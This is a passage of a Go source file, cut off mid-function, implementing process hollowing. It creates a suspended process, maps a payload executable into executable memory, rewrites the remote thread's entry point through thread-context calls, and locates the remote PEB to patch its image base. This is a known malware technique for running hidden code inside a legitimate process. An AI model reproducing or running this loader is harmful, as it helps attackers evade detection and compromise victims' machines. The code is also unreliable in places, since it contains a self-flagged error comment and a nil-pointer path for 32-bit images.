package main

/*
#include <string.h>
#include <stdint.h>
#include <windows.h>
#include <stdlib.h>
*/
import "C"
import (
	"debug/pe"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"github.com/freboat/gomem/mem"
)

//TerminateProcess func
func TerminateProcess(pid uint32) bool {
	var isKilled bool
	hProcess, err := syscall.OpenProcess(syscall.PROCESS_TERMINATE, false, pid)
	if err != nil {
		return false
	}
	if err := syscall.TerminateProcess(hProcess, 0); err == nil {
		isKilled = true
	} else {
		fmt.Printf("Could not terminate the process. PID = %d\n", pid)
	}
	syscall.CloseHandle(hProcess)
	return isKilled
}

//GetFileSize func
func GetFileSize(hFile syscall.Handle, lpFileSizeHigh uint32) (size uint64, e error) {
	r, _, err := procGetFileSize.Call(
		uintptr(hFile),
		uintptr(unsafe.Pointer(&lpFileSizeHigh)),
	)
	if r == 0 {
		e = err
	}
	size = uint64(r)
	return
}

//IsBadReadPtr func
func IsBadReadPtr(lp uintptr, ucb uint64) bool {
	r, _, _ := procIsBadReadPtr.Call(lp, uintptr(ucb))
	return r != 0
}

//VirtualAlloc func
func VirtualAlloc(
	lpAddress uintptr, dwSize uint64, flAllocationType uint32, flProtect uint32,
) (addr uintptr, e error) {
	ret, _, err := procVirtualAlloc.Call(
		lpAddress,
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if ret == 0 {
		e = err
	}
	addr = ret
	log.Printf("VirtualAlloc[%x]: [%X] %v\n", lpAddress, ret, err)
	return
}

//VirtualAllocEx func
func VirtualAllocEx(
	hProcess syscall.Handle, lpAddress uintptr, dwSize uint64, flAllocationType uint32, flProtect uint32,
) (addr uintptr, e error) {
	ret, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		lpAddress,
		uintptr(dwSize),
		uintptr(flAllocationType),
		uintptr(flProtect))
	if ret == 0 {
		e = err
	}
	addr = ret
	log.Printf("VirtualAllocEx[%v : %x]: [%X] %v", hProcess, lpAddress, ret, err)
	return
}

//gLoadPEModule1 func
func gLoadPEModule1(fileName string, vSize *uint64, executable, relocate bool) uintptr {
	var rSize uint64
	dllRawData := gLoadFile(fileName, &rSize)
	if dllRawData == 0 {
		log.Println("Cannot load the file: ", fileName)
		return 0
	}
	mappedDll := gLoadPEModule2(dllRawData, rSize, vSize, executable, relocate)
	gFreePEBuffer(dllRawData, 0)
	return mappedDll
}

//AllocAligned func
func AllocAligned(bufferSize uint64, protect uint32, desiredBase uint64) uintptr {
	buf, err := VirtualAlloc(
		uintptr(desiredBase), bufferSize, MEM_COMMIT|MEM_RESERVE, protect,
	)
	if err != nil {
		log.Println("Error VirtualAlloc: ", err.Error())
	}
	return buf
}

//GetNTHdrs func
func GetNTHdrs(peBuffer uintptr, bufferSize uint64) uintptr {
	if peBuffer == 0 {
		return 0
	}
	idh := (*IMAGE_DOS_HEADER)(unsafe.Pointer(peBuffer))
	if bufferSize != 0 {
		if !gValidatePtr(
			peBuffer,
			bufferSize,
			uintptr(unsafe.Pointer(idh)),
			uint64(unsafe.Sizeof(IMAGE_DOS_HEADER{})),
		) {
			return 0
		}
	}
	if IsBadReadPtr(
		uintptr(unsafe.Pointer(idh)), uint64(unsafe.Sizeof(IMAGE_DOS_HEADER{})),
	) {
		return 0
	}
	if idh.E_magic != IMAGE_DOS_SIGNATURE {
		return 0
	}
	var kMaxOffset int32 = 1024
	peOffset := idh.E_lfanew

	if peOffset > kMaxOffset {
		return 0
	}

	inh := (*IMAGE_NT_HEADERS)(unsafe.Pointer(peBuffer + uintptr(peOffset)))
	if bufferSize != 0 {
		if !gValidatePtr(
			peBuffer,
			bufferSize,
			uintptr(unsafe.Sizeof(inh)),
			uint64(unsafe.Sizeof(IMAGE_NT_HEADERS{})),
		) {
			return 0
		}
	}
	if IsBadReadPtr(
		uintptr(unsafe.Pointer(inh)), uint64(unsafe.Sizeof(IMAGE_DOS_HEADER{})),
	) {
		return 0
	}
	if inh.Signature != IMAGE_NT_SIGNATURE {
		return 0
	}
	return uintptr(unsafe.Pointer(inh))
}

//gGetNTHdrArch func
func gGetNTHdrArch(peBuffer uintptr) uint16 {
	ptr := GetNTHdrs(peBuffer, 0)
	if ptr == 0 {
		return 0
	}
	inh := (*IMAGE_NT_HEADERS)(unsafe.Pointer(ptr))
	if IsBadReadPtr(
		uintptr(unsafe.Pointer(inh)),
		uint64(unsafe.Sizeof(IMAGE_NT_HEADERS{})),
	) {
		return 0
	}
	return inh.OptionalHeader.Magic
}

//gIs64Bit func
func gIs64Bit(peBuffer uintptr) bool {
	arch := gGetNTHdrArch(peBuffer)
	if arch == IMAGE_NT_OPTIONAL_HDR64_MAGIC {
		return true
	}
	return false
}

//gGetImageBase func
func gGetImageBase(peBuffer uintptr) uintptr {
	is64b := gIs64Bit(peBuffer)
	//update image base in the written content:
	payloadNTHdr := GetNTHdrs(peBuffer, 0)
	if payloadNTHdr == 0 {
		return 0
	}
	var imgBase uintptr
	if is64b {
		payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(payloadNTHdr))
		imgBase = uintptr(payloadNTHdr64.OptionalHeader.ImageBase)
	} else {
		payloadNTHdr32 := (*IMAGE_NT_HEADERS)(unsafe.Pointer(payloadNTHdr))
		imgBase = uintptr(payloadNTHdr32.OptionalHeader.ImageBase)
	}
	return imgBase
}

//GetDirectoryEntry func
func GetDirectoryEntry(
	peBuffer uintptr, dirID uint32, allowEmpty bool) *pe.DataDirectory {
	if dirID >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES {
		return nil
	}
	ntHeaders := GetNTHdrs(peBuffer, 0)
	if ntHeaders == 0 {
		return nil
	}
	var peDir *pe.DataDirectory
	if gIs64Bit(peBuffer) {
		ntHeaders64 := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ntHeaders))
		peDir = &(ntHeaders64.OptionalHeader.DataDirectory[dirID])
	}
	if !allowEmpty && peDir.VirtualAddress == 0 {
		return nil
	}
	return peDir
}

//gHasRelocations func
func gHasRelocations(peBuffer uintptr) bool {
	relocDir := GetDirectoryEntry(peBuffer, pe.IMAGE_DIRECTORY_ENTRY_BASERELOC, false)
	if relocDir == nil {
		return false
	}
	return true
}

//ApplyRelocCallback struct
type ApplyRelocCallback struct {
	is64bit bool
	oldBase uintptr
	newBase uintptr
}

func (a *ApplyRelocCallback) processRelocField(relocField uintptr) bool {
	if a.is64bit {
		relocateAddr := (*uintptr)(unsafe.Pointer(relocField))
		rva := *relocateAddr - a.oldBase
		*relocateAddr = rva + a.newBase
	} else {
		relocateAddr := (*uint32)(unsafe.Pointer(relocField))
		rva := uintptr(*relocateAddr) - a.oldBase
		*relocateAddr = uint32(rva + a.newBase)
	}
	return true
}

//gApplyRelocations func
func gApplyRelocations(
	modulePtr uintptr, moduleSize uint64, newBase, oldBase uintptr,
) bool {
	is64b := gIs64Bit(modulePtr)
	callback := ApplyRelocCallback{is64b, oldBase, newBase}
	return ProcessRelocationTable(modulePtr, moduleSize, &callback)
}

//ProcessRelocBlock func
func ProcessRelocBlock(
	block *BASE_RELOCATION_ENTRY,
	entriesNum uint64,
	page uint32,
	modulePtr uintptr,
	moduleSize uint64,
	is64bit bool,
	callback *ApplyRelocCallback,
) bool {
	entry := block
	var i uint64
	for i = 0; i < entriesNum; i++ {
		if !gValidatePtr(
			modulePtr,
			moduleSize,
			uintptr(unsafe.Pointer(entry)),
			uint64(unsafe.Sizeof(BASE_RELOCATION_ENTRY{})),
		) {
			break
		}
		offset := uint32(entry.Offset)
		eType := uint32(entry.Type)

		if eType == 0 {
			break
		}

		if eType != RELOC_32BIT_FIELD && eType != RELOC_64BIT_FIELD {
			if callback != nil { //print debug messages only if the callback function was set
				log.Printf("[-] Not supported relocations format at %d: %d\n", i, eType)
			}
			return false
		}

		relocField := page + offset
		if relocField >= uint32(moduleSize) {
			if callback != nil { //print debug messages only if the callback function was set
				log.Printf("[-] Malformed field: %lx\n", relocField)
			}
			return false
		}
		if callback != nil {
			isOK := callback.processRelocField(modulePtr + uintptr(relocField))
			if !isOK {
				log.Println("[-] Failed processing reloc field at: \n", relocField)
				return false
			}
		}
		entry = (*BASE_RELOCATION_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(entry)) + unsafe.Sizeof(*new(uint16))))
	}
	return true
}

//ProcessRelocationTable func
func ProcessRelocationTable(
	modulePtr uintptr, moduleSize uint64, callback *ApplyRelocCallback,
) bool {
	relocDir := GetDirectoryEntry(modulePtr, IMAGE_DIRECTORY_ENTRY_BASERELOC, false)
	if relocDir == nil {
		log.Println("[!] WARNING: no relocation table found!")
		return false
	}
	if !gValidatePtr(
		modulePtr,
		moduleSize,
		uintptr(unsafe.Pointer(relocDir)),
		uint64(unsafe.Sizeof(pe.DataDirectory{}))) {
		return false
	}
	maxSize := relocDir.Size
	relocAddr := relocDir.VirtualAddress
	is64b := gIs64Bit(modulePtr)

	var reloc *IMAGE_BASE_RELOCATION

	var parsedSize uint32
	for parsedSize < maxSize {
		reloc = (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(uintptr(relocAddr+parsedSize) + modulePtr))
		if !gValidatePtr(
			modulePtr,
			moduleSize,
			uintptr(unsafe.Pointer(reloc)),
			uint64(unsafe.Sizeof(IMAGE_BASE_RELOCATION{})),
		) {
			log.Println("[-] Invalid address of relocations")
			return false
		}
		parsedSize += reloc.SizeOfBlock

		if reloc.SizeOfBlock == 0 {
			break
		}

		var entriesNum uint64 = uint64((uintptr(reloc.SizeOfBlock) - 2*unsafe.Sizeof(*new(uint32))) / unsafe.Sizeof(*new(uint16)))
		page := reloc.VirtualAddress

		block := (*BASE_RELOCATION_ENTRY)(unsafe.Pointer(uintptr(unsafe.Pointer(reloc)) + unsafe.Sizeof(*new(uint32))*2))
		if !gValidatePtr(
			modulePtr,
			moduleSize,
			uintptr(unsafe.Pointer(block)),
			uint64(unsafe.Sizeof(BASE_RELOCATION_ENTRY{})),
		) {
			log.Println("[-] Invalid address of relocations block")
			return false
		}
		if ProcessRelocBlock(
			block, entriesNum, page, modulePtr, moduleSize, is64b, callback) == false {
			return false
		}
	}
	return parsedSize != 0
}

//gRelocateModule func
func gRelocateModule(
	modulePtr uintptr, moduleSize uint64, newBase, oldBase uintptr) bool {
	if modulePtr == 0 {
		return false
	}
	if oldBase == 0 {
		oldBase = gGetImageBase(modulePtr)
	}
	log.Printf("New Base: %X\n", newBase)
	log.Printf("Old Base: %X\n", oldBase)
	if newBase == oldBase {
		log.Println("Nothing to relocate! oldBase is the same as the newBase!")
		return true //nothing to relocate
	}
	if gApplyRelocations(modulePtr, moduleSize, newBase, oldBase) {
		return true
	}
	log.Println("Could not relocate the module!")
	return false
}

//AllocPEBuffer func
func AllocPEBuffer(bufferSize uint64, protect uint32, desiredBase uintptr) uintptr {
	return AllocAligned(bufferSize, protect, uint64(desiredBase))
}

//gSectionsRawToVirtual func
func gSectionsRawToVirtual(
	payload uintptr, payloadSize uint64, destBuffer uintptr, destBufferSize uint64,
) bool {
	if payload == 0 || destBuffer == 0 {
		return false
	}

	is64b := gIs64Bit(payload)

	payloadNTHdr := GetNTHdrs(payload, 0)
	if payloadNTHdr == 0 {
		log.Println("Invalid payload: ", payload)
		return false
	}
	log.Println("________________GO SECTIONS RAW TO VIRTUAL START___________")
	//log.Printf("Payload: %X\n", *((*[]byte)(unsafe.Pointer(payload))))
	log.Printf("Payload NT Header: %X\n", payloadNTHdr)
	var fileHdr *pe.FileHeader
	var hdrSize uint32
	var secptr uintptr
	if is64b {
		payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(payloadNTHdr))
		fileHdr = &(payloadNTHdr64.FileHeader)
		hdrSize = payloadNTHdr64.OptionalHeader.SizeOfHeaders
		secptr = uintptr(unsafe.Pointer(&(payloadNTHdr64.OptionalHeader))) + uintptr(fileHdr.SizeOfOptionalHeader)
	} else {
		payloadNTHdr32 := (*IMAGE_NT_HEADERS)(unsafe.Pointer(payloadNTHdr))
		fileHdr = &(payloadNTHdr32.FileHeader)
		hdrSize = payloadNTHdr32.OptionalHeader.SizeOfHeaders
		secptr = uintptr(unsafe.Pointer(&(payloadNTHdr32.OptionalHeader))) + uintptr(fileHdr.SizeOfOptionalHeader)
	}
	log.Printf("Secptr: %X\n", secptr)
	log.Printf("Size of PE.SECTION_HEADER: %d\n", unsafe.Sizeof(pe.SectionHeader32{}))
	var firstRaw uint32
	//copy all the sections, one by one:
	//var rawEnd uint64
	var i uint16
	for i = 0; i < fileHdr.NumberOfSections; i++ {
		//HERE IS ERROR nextSec first cycle need to be = secptr!!!
		nextSec := (*pe.SectionHeader32)(unsafe.Pointer(secptr + uintptr(IMAGE_SIZEOF_SECTION_HEADER*i)))
		log.Printf("NextSec: %X\n", nextSec)
		if !gValidatePtr(
			payload,
			destBufferSize,
			uintptr(unsafe.Pointer(nextSec)),
			IMAGE_SIZEOF_SECTION_HEADER,
		) {
			return false
		}
		if nextSec.PointerToRawData == 0 || nextSec.SizeOfRawData == 0 {
			continue //skipping empty
		}
		sectionMapped := destBuffer + uintptr(nextSec.VirtualAddress)
		sectionRawPtr := payload + uintptr(nextSec.PointerToRawData)
		secSize := uint64(nextSec.SizeOfRawData)
		//rawEnd = uint64(nextSec.Size + nextSec.Offset)

		if (uint64(nextSec.VirtualAddress) + secSize) > destBufferSize {
			log.Println("[!] Virtual section size is out ouf bounds: ", secSize)
			if destBufferSize > uint64(nextSec.VirtualAddress) {
				secSize = destBufferSize - uint64(nextSec.VirtualAddress)
			} else {
				secSize = 0
			}
			log.Printf("[!] Truncated to maximal size: %d, buffer size: %d", secSize, destBufferSize)
		}

		if (uint64(nextSec.VirtualAddress) >= destBufferSize) && secSize != 0 {
			log.Println("[-] VirtualAddress of section is out ouf bounds: ", nextSec.VirtualAddress)
			return false
		}
		if (uint64(nextSec.PointerToRawData) + secSize) > destBufferSize {
			log.Println("[-] Raw section size is out ouf bounds: ", secSize)
			return false
		}
		// validate source:
		if !gValidatePtr(payload, payloadSize, sectionRawPtr, secSize) {
			log.Printf("[-] Section %d:  out ouf bounds, skipping... \n", i)
			continue
		}
		// validate destination:
		if !gValidatePtr(destBuffer, destBufferSize, sectionMapped, secSize) {
			log.Printf("[-] Section %d:  out ouf bounds, skipping... \n", i)
			continue
		}
		mem.Memcpy(
			unsafe.Pointer(sectionMapped), unsafe.Pointer(sectionRawPtr), int(secSize))
		if firstRaw == 0 || (nextSec.PointerToRawData < firstRaw) {
			firstRaw = nextSec.PointerToRawData
		}
	}

	//copy payload's headers:
	if hdrSize == 0 {
		hdrSize = firstRaw
		log.Println("hdrsSize not filled, using calculated size: ", hdrSize)
	}
	if !gValidatePtr(payload, destBufferSize, payload, uint64(hdrSize)) {
		return false
	}
	mem.Memcpy(
		unsafe.Pointer(destBuffer), unsafe.Pointer(payload), int(hdrSize))
	log.Printf("DestBuffer ptr: %X\n", destBuffer)
	//log.Printf("DestBuffer: %X\n", *((*[]byte)(unsafe.Pointer(destBuffer))))
	log.Printf("________________GO SECTIONS RAW TO VIRTUAL END___________\n")
	return true
}

//VirtualFree func
func VirtualFree(lpAddress uintptr, dwSize uint64, dwFreeType uint32) bool {
	r, _, _ := procVirtualFree.Call(lpAddress, uintptr(dwSize), uintptr(dwFreeType))
	return r != 0
}

//FreeAligned func
func FreeAligned(buffer uintptr, bufferSize uint64) bool {
	if buffer == 0 {
		return true
	}
	if !VirtualFree(buffer, 0, MEM_RELEASE) {
		log.Println("Releasing failed")
		return false
	}
	return true
}

//gFreePEBuffer func
func gFreePEBuffer(buffer uintptr, bufferSize uint64) bool {
	return FreeAligned(buffer, bufferSize)
}

//gValidatePtr func
func gValidatePtr(
	bufferBgn uintptr, bufferSize uint64, fieldBgn uintptr, fieldSize uint64,
) bool {
	if bufferBgn == 0 || fieldBgn == 0 {
		return false
	}
	start := bufferBgn
	end := start + uintptr(bufferSize)

	fieldStart := fieldBgn
	fieldEnd := fieldStart + uintptr(fieldSize)

	if fieldStart < start {
		return false
	}
	if fieldEnd > end {
		return false
	}
	return true
}

//gPERawToVirtual func
func gPERawToVirtual(
	payload uintptr, inSize uint64, outSize *uint64, executable bool, desiredBase uintptr,
) uintptr {
	//check payload:
	ntHdr := GetNTHdrs(payload, 0)
	if ntHdr == 0 {
		log.Println("Invalid payload: ", payload)
		return 0
	}
	var payloadImageSize uint32
	is64 := gIs64Bit(payload)
	if is64 {
		payloadNtHdr := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(ntHdr))
		payloadImageSize = payloadNtHdr.OptionalHeader.SizeOfImage
	} else {
		payloadNtHdr := (*IMAGE_NT_HEADERS)(unsafe.Pointer(ntHdr))
		payloadImageSize = payloadNtHdr.OptionalHeader.SizeOfImage
	}
	var protect uint32
	if executable {
		protect = PAGE_EXECUTE_READWRITE
	} else {
		protect = PAGE_READWRITE
	}

	//first we will prepare the payload image in the local memory, so that it will be easier to edit it, apply relocations etc.
	//when it will be ready, we will copy it into the space reserved in the target process
	localCopyAddress := AllocPEBuffer(uint64(payloadImageSize), protect, desiredBase)
	if localCopyAddress == 0 {
		log.Println("Could not allocate memory in the current process")
		return 0
	}

	if !gSectionsRawToVirtual(payload, inSize, localCopyAddress, uint64(payloadImageSize)) {
		log.Println("Could not copy PE file")
		return 0
	}
	*outSize = uint64(payloadImageSize)
	return localCopyAddress
}

//GetSubSystem func
func GetSubSystem(payload uintptr) uint16 {
	if payload == 0 {
		return 0
	}
	is64b := gIs64Bit(payload)
	payloadNTHdr := GetNTHdrs(payload, 0)
	if payloadNTHdr == 0 {
		return 0
	}
	if is64b {
		payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(payloadNTHdr))
		return payloadNTHdr64.OptionalHeader.Subsystem
	} else {
		payloadNTHdr32 := (*IMAGE_NT_HEADERS)(unsafe.Pointer(payloadNTHdr))
		return payloadNTHdr32.OptionalHeader.Subsystem
	}
}

//gIsTargetCompatible func
func gIsTargetCompatible(
	payloadBuf uintptr, payloadSize uint64, targetPath string) bool {
	if payloadBuf == 0 {
		log.Println("Incompatibile target")
		return false
	}
	payloadSubs := GetSubSystem(payloadBuf)

	var targetSize uint64
	targetPE := gLoadPEModule1(targetPath, &targetSize, false, false)
	if targetPE == 0 {
		log.Println("Incompatibile target")
		return false
	}
	targetSubs := GetSubSystem(targetPE)
	is64bitTarget := gIs64Bit(targetPE)
	gFreePEBuffer(targetPE, 0)
	targetPE = 0
	targetSize = 0

	if is64bitTarget != gIs64Bit(payloadBuf) {
		log.Println("Incompatibile target bitness!")
		return false
	}
	//only a payload with GUI subsystem can be run by both GUI and CLI
	if payloadSubs != IMAGE_SUBSYSTEM_WINDOWS_GUI && targetSubs != payloadSubs {
		log.Println("Incompatibile target subsystem!")
		return false
	}
	return true
}

//gCreateSuspendedProcess func
func gCreateSuspendedProcess(path string, pi *syscall.ProcessInformation) bool {
	var si syscall.StartupInfo
	mem.Memset(
		unsafe.Pointer(&si), 0, int(unsafe.Sizeof(syscall.StartupInfo{})))
	si.Cb = uint32(unsafe.Sizeof(syscall.StartupInfo{}))

	mem.Memset(
		unsafe.Pointer(pi), 0, int(unsafe.Sizeof(syscall.ProcessInformation{})))

	if err := syscall.CreateProcess(
		nil,
		syscall.StringToUTF16Ptr(path),
		nil,
		nil,
		false,
		CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		pi); err != nil {
		log.Println("Error CreateProcess: ", err.Error())
		return false
	}
	log.Println("ProcessID in C: ", pi.ProcessId)
	return true
}

//gLoadFile func
func gLoadFile(fileName string, readSize *uint64) uintptr {
	file, err := syscall.CreateFile(
		syscall.StringToUTF16Ptr(fileName),
		syscall.GENERIC_READ,
		syscall.FILE_SHARE_READ,
		nil,
		syscall.OPEN_EXISTING,
		syscall.FILE_ATTRIBUTE_NORMAL,
		0,
	)
	if err != nil {
		log.Println("Error CreateFile: !", err.Error())
	}
	if file == syscall.InvalidHandle {
		log.Println("Could not open file!")
		return 0
	}
	mapping, err := syscall.CreateFileMapping(file, nil, syscall.PAGE_READONLY, 0, 0, nil)
	if err != nil {
		log.Println("Error CreateFileMapping: !", err.Error())
		syscall.CloseHandle(file)
		return 0
	}
	dllRawData, err := syscall.MapViewOfFile(mapping, syscall.FILE_MAP_READ, 0, 0, 0)
	if err != nil {
		log.Println("Error MapViewOfFile: !", err.Error())
		syscall.CloseHandle(mapping)
		syscall.CloseHandle(file)
		return 0
	}

	rSize, err := GetFileSize(file, 0)
	if err != nil {
		log.Println("Error GetFileSize: !", err.Error())
	}
	if *readSize != 0 && *readSize <= rSize {
		rSize = *readSize
	}
	if IsBadReadPtr(dllRawData, rSize) {
		fmt.Printf("[-] Mapping of %s is invalid!\n", fileName)
		syscall.UnmapViewOfFile(dllRawData)
		syscall.CloseHandle(mapping)
		syscall.CloseHandle(file)
		return 0
	}
	localCopyAddress := AllocAligned(rSize, syscall.PAGE_READWRITE, 0)
	if localCopyAddress != 0 {
		mem.Memcpy(unsafe.Pointer(localCopyAddress), unsafe.Pointer(dllRawData), int(rSize))
		*readSize = rSize
	} else {
		*readSize = 0
		log.Println("Could not allocate memory in the current process")
	}
	syscall.UnmapViewOfFile(dllRawData)
	syscall.CloseHandle(mapping)
	syscall.CloseHandle(file)
	return localCopyAddress
}

//gLoadPEModule2 func
func gLoadPEModule2(dllRawData uintptr, rSize uint64, vSize *uint64, executable, relocate bool) uintptr {
	// by default, allow to load the PE at any base:
	var desiredBase uintptr
	// if relocating is required, but the PE has no relocation table...
	if relocate && !gHasRelocations(dllRawData) {
		// ...enforce loading the PE image at its default base (so that it will need no relocations)
		desiredBase = gGetImageBase(dllRawData)
	}
	// load a virtual image of the PE file at the desired_base address (random if desired_base is NULL):
	mappedDll := gPERawToVirtual(dllRawData, rSize, vSize, executable, desiredBase)
	fmt.Printf("MAPPEDDLL: %X\n", mappedDll)
	if mappedDll != 0 {
		//if the image was loaded at its default base, relocate_module will return always true (because relocating is already done)
		if relocate && !gRelocateModule(mappedDll, *vSize, mappedDll, 0) {
			// relocating was required, but it failed - thus, the full PE image is useless
			log.Println("Could not relocate the module!")
			gFreePEBuffer(mappedDll, *vSize)
			mappedDll = 0
		}
	} else {
		log.Println("Could not allocate memory at the desired base!")
	}
	return mappedDll
}

//ResumeThread func
func ResumeThread(hThread syscall.Handle) (count int32, e error) {
	ret, _, err := procResumeThread.Call(uintptr(hThread))
	if ret == 0xffffffff {
		e = err
	}
	count = int32(ret)
	log.Printf("ResumeThread[%v]: [%v] %v", hThread, ret, err)
	return
}

//WriteProcessMemory func
func WriteProcessMemory(
	hProcess syscall.Handle, lpBaseAddress uintptr, data uintptr, size uint64,
) (e error) {
	var numBytesRead uint64
	r, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		lpBaseAddress,
		data,
		uintptr(size),
		uintptr(unsafe.Pointer(&numBytesRead)))
	if r == 0 {
		e = err
	}
	log.Printf("WriteProcessMemory[%v : %#x]: [%#x] num bytes %d %v", hProcess, lpBaseAddress, r, numBytesRead, err)
	return
}

//Wow64GetThreadContext func
func Wow64GetThreadContext(h syscall.Handle, pc *WOW64_CONTEXT) bool {
	r, _, err := procWow64GetThreadContext.Call(
		uintptr(h), uintptr(unsafe.Pointer(pc)),
	)
	if r == 0 {
		log.Println("Error Wow64GetThreadContext: ", err.Error())
		return false
	}

	return int(r) > 0
}

//Wow64SetThreadContext func
func Wow64SetThreadContext(h syscall.Handle, pc *WOW64_CONTEXT) bool {
	r, _, err := procWow64SetThreadContext.Call(
		uintptr(h), uintptr(unsafe.Pointer(pc)),
	)
	if r == 0 {
		log.Println("Error Wow64SetThreadContext: ", err.Error())
		return false
	}

	return int(r) > 0
}

//GetThreadContext func
func GetThreadContext(hThread syscall.Handle, ctx *CONTEXT) (e error) {
	r, _, err := procGetThreadContext.Call(
		uintptr(hThread), uintptr(unsafe.Pointer(ctx)),
	)
	if r == 0 {
		e = err
	}
	log.Printf("GetThreadContext[%v]: [%v] %v", hThread, r, err)
	return
}

//SetThreadContext func
func SetThreadContext(hThread syscall.Handle, ctx *CONTEXT) (e error) {
	r, _, err := procSetThreadContext.Call(
		uintptr(hThread), uintptr(unsafe.Pointer(ctx)),
	)
	if r == 0 {
		e = err
	}
	log.Printf("SetThreadContext[%v]: [%v] %v", hThread, r, err)
	return
}

//UpdateImageBase func
func UpdateImageBase(payload, destImageBase uintptr) bool {
	is64b := gIs64Bit(payload)
	payloadNTHdr := GetNTHdrs(payload, 0)
	if payloadNTHdr == 0 {
		return false
	}
	if is64b {
		payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(payloadNTHdr))
		payloadNTHdr64.OptionalHeader.ImageBase = uint64(destImageBase)
	} else {
		payloadNTHdr32 := (*IMAGE_NT_HEADERS)(unsafe.Pointer(payloadNTHdr))
		payloadNTHdr32.OptionalHeader.ImageBase = uint32(destImageBase)
	}
	return true
}

//gGetEntryPointRVA func
func gGetEntryPointRVA(peBuffer uintptr) uint32 {
	is64b := gIs64Bit(peBuffer)
	//update image base in the written content:
	payloadNTHdr := GetNTHdrs(peBuffer, 0)
	if payloadNTHdr == 0 {
		return 0
	}
	var value uint32
	if is64b {
		payloadNTHdr64 := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(payloadNTHdr))
		value = payloadNTHdr64.OptionalHeader.AddressOfEntryPoint
	} else {
		payloadNTHdr32 := (*IMAGE_NT_HEADERS)(unsafe.Pointer(payloadNTHdr))
		value = payloadNTHdr32.OptionalHeader.AddressOfEntryPoint
	}
	return value
}

//gUpdateRemoteEntryPoint func
func gUpdateRemoteEntryPoint(
	pi *syscall.ProcessInformation, entryPointVA uintptr, is32bit bool,
) bool {
	log.Println("Writing new EP: ", entryPointVA)
	if is32bit {
		// The target is a 32 bit executable while the loader is 64bit,
		// so, in order to access the target we must use Wow64 versions of the functions:

		// 1. Get initial context of the target:
		var context WOW64_CONTEXT
		mem.Memset(
			unsafe.Pointer(&context), 0, int(unsafe.Sizeof(WOW64_CONTEXT{})))
		context.ContextFlags = CONTEXT_INTEGER
		if !Wow64GetThreadContext(pi.Thread, &context) {
			return false
		}
		// 2. Set the new Entry Point in the context:
		context.Eax = uint32(entryPointVA)

		// 3. Set the changed context into the target:
		return Wow64SetThreadContext(pi.Thread, &context)
	}
	// 1. Get initial context of the target:
	var context CONTEXT
	mem.Memset(
		unsafe.Pointer(&context), 0, int(unsafe.Sizeof(CONTEXT{})))
	context.contextflags = CONTEXT_INTEGER
	err := GetThreadContext(pi.Thread, &context)
	if err != nil {
		log.Println("Error GetThreadContext: ", err.Error())
		return false
	}
	// 2. Set the new Entry Point in the context:
	context.rcx = uint64(entryPointVA)
	// 3. Set the changed context into the target:
	err = SetThreadContext(pi.Thread, &context)
	if err != nil {
		log.Println("Error SetThreadContext: ", err.Error())
		return false
	}
	return true
}

//gGetRemotePebAddr func
func gGetRemotePebAddr(pi *syscall.ProcessInformation, is32bit bool) uintptr {
	if is32bit {
		//get initial context of the target:
		var context WOW64_CONTEXT
		mem.Memset(
			unsafe.Pointer(&context), 0, int(unsafe.Sizeof(WOW64_CONTEXT{})))
		context.ContextFlags = CONTEXT_INTEGER
		if !Wow64GetThreadContext(pi.Thread, &context) {
			log.Println("Wow64 cannot get context!")
			return 0
		}
		//get remote PEB from the context
		return uintptr(context.Ebx)
	}
	var PEBAddr uintptr
	var context CONTEXT
	mem.Memset(
		unsafe.Pointer(&context), 0, int(unsafe.Sizeof(CONTEXT{})))
	context.contextflags = CONTEXT_INTEGER
	err := GetThreadContext(pi.Thread, &context)
	if err != nil {
		log.Println("Error GetThreadContext: ", err.Error())
		return 0
	}
	PEBAddr = uintptr(context.rdx)
	return PEBAddr
}

//GetImgBasePebOffset func
func GetImgBasePebOffset(is32bit bool) uintptr {
	/*
	   We calculate this offset in relation to PEB,
	   that is defined in the following way
	   (source "ntddk.h"):

	   typedef struct _PEB
	   {
	       BOOLEAN InheritedAddressSpace; // size: 1
	       BOOLEAN ReadImageFileExecOptions; // size : 1
	       BOOLEAN BeingDebugged; // size : 1
	       BOOLEAN SpareBool; // size : 1
	                       // on 64bit here there is a padding to the sizeof ULONGLONG (DWORD64)
	       HANDLE Mutant; // this field have DWORD size on 32bit, and ULONGLONG (DWORD64) size on 64bit

	       PVOID ImageBaseAddress;
	       [...]
	*/
	var imgBaseOffset uintptr
	if is32bit {
		imgBaseOffset = unsafe.Sizeof(*new(uint32)) * 2
	} else {
		imgBaseOffset = unsafe.Sizeof(*new(uintptr)) * 2
	}
	return imgBaseOffset
}

//gRedirectToPayload func
func gRedirectToPayload(
	loadedPE uintptr, loadBase uintptr, pi *syscall.ProcessInformation, is32bit bool,
) bool {
	//1. Calculate VA of the payload's EntryPoint
	ep := gGetEntryPointRVA(loadedPE)
	epVA := loadBase + uintptr(ep)
	log.Printf("EP in GO: %#x\n", ep)
	log.Printf("EPVA in GO: %#x\n", epVA)
	//2. Write the new Entry Point into context of the remote process:
	if gUpdateRemoteEntryPoint(pi, epVA, is32bit) == false {
		log.Println("Cannot update remote EP!")
		return false
	}
	//3. Get access to the remote PEB:
	remotePebAddr := gGetRemotePebAddr(pi, is32bit)
	if remotePebAddr == 0 {
		log.Println("Failed getting remote PEB address!")
		return false
	}
	log.Printf("Remote Peb Addr in GO: %#x\n", remotePebAddr)
	// get the offset to the PEB's field where the ImageBase should be saved (depends on architecture):
	remoteImgBase := remotePebAddr + GetImgBasePebOffset(is32bit)
	log.Printf("Remote Image Base in GO: %#x\n", remoteImgBase)
	//calculate size of the field (depends on architecture):
	var imgBaseSize uint64
	if is32bit {
		imgBaseSize = uint64(unsafe.Sizeof(*new(uint32)))
	} else {
		imgBaseSize = uint64(unsafe.Sizeof(*new(uintptr)))
